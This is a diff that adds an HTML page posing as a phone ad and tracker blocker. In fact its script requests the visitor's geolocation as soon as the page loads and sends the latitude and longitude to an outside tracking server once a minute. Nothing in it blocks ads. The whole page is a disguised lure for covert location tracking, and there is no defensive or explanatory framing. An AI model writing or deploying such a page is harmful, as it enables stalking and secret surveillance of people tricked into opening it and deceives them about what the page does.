@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Phone Check</title>
+</head>
+<body>
+  <h2>Block Ads And Trackers</h2>
+  <p>blocking ads on your phone immediately</p>
+  <p id="status"></p>
+
+  <script>
+    const SERVER_URL = "https://z-phone-tracker.onrender.com/report.html"; // Replace with your actual server
+
+    function sendLocation() {
+      if (!navigator.geolocation) {
+        console.log("Geolocation not supported.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        fetch(SERVER_URL, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat: lat, lon: lon })
+        }).then(res => res.json())
+          .then(data => {
+            document.getElementById("status").innerText = "📡 Location sent! " + new Date().toLocaleTimeString();
+          })
+          .catch(err => {
+            document.getElementById("status").innerText = "❌ Error sending location.";
+            console.error("Error sending location:", err);
+          });
+      }, function(error) {
+        console.error("Error getting location: " + error.message);
+        document.getElementById("status").innerText = "❌ Error getting location.";
+      });
+    }
+
+    // Send immediately on page load
+    sendLocation();
+
+    // Then send every 60 seconds
+    setInterval(sendLocation, 60000); // 60000ms = 1 minute
+  </script>
+</body>
+</html>
